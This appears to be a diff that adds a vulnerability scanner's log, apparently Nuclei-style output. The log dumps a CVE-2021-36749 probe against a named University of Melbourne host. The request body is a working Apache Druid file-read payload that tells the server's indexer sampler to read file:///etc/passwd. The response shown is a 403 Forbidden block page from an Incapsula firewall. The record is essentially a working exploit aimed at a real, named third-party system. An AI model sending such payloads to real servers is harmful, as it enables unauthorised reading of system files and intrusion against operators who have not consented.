@@ -1,0 +1,24 @@
+[CVE-2021-36749] Dumped HTTP request for https://enrolments.hildas.unimelb.edu.au/druid/indexer/v1/sampler?for=connect
+
+
+POST /druid/indexer/v1/sampler?for=connect HTTP/1.1
+Host: enrolments.hildas.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 410
+Content-Type: application/json
+Accept-Encoding: gzip
+
+{"type":"index","spec":{"type":"index","ioConfig":{"type":"index","firehose":{"type":"http","uris":[" file:///etc/passwd "]}},"dataSchema":{"dataSource":"sample","parser":{"type":"string", "parseSpec":{"format":"regex","pattern":"(.*)","columns":["a"],"dimensionsSpec":{},"timestampSpec":{"column":"no_ such_ column","missingValue":"2010-01-01T00:00:00Z"}}}}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}
+[CVE-2021-36749] Dumped HTTP response https://enrolments.hildas.unimelb.edu.au/druid/indexer/v1/sampler?for=connect
+
+HTTP/1.1 403 Forbidden
+Connection: close
+Content-Length: 833
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Set-Cookie: visid_incap_3211538=ENoiV42XRvq1xlQxuRtwVAxyk2gAAAAAQUIPAAAAAADMzg4IrE202oCS2s7ZphXS; expires=Thu, 06 Aug 2026 07:06:45 GMT; HttpOnly; path=/; Domain=.hildas.unimelb.edu.au
+Set-Cookie: incap_ses_237_3211538=dG3zZEqiSSWD6barov5JAwxyk2gAAAAAlVAMqkF/R69KSJMtHlqK+g==; path=/; Domain=.hildas.unimelb.edu.au
+X-Iinfo: 5-4041459-0 NNNN RT(1754493453269 15) q(0 0 -1 -1) r(0 -1) B15(1,10037,1) U6
+
+<html style="height:100%"><head><META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW"><meta name="format-detection" content="telephone=no"><meta name="viewport" content="initial-scale=1.0"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><script src="/Front-Night-supt-I-keepe-mans-his-rauing-it-of-N" async></script></head><body style="margin:0px;height:100%"><iframe id="main-iframe" src="/_Incapsula_Resource?CWUDNSAI=23&xinfo=5-4041459-0%20NNNN%20RT%281754493453269%2015%29%20q%280%200%20-1%20-1%29%20r%280%20-1%29%20B15%281%2c10037%2c1%29%20U6&incident_id=237000430032587158-21069988583246533&edet=15&cinfo=01000000cefb&rpinfo=0&mth=POST" frameborder=0 width="100%" height="100%" marginheight="0px" marginwidth="0px">Request unsuccessful. Incapsula incident ID: 237000430032587158-21069988583246533</iframe></body></html>
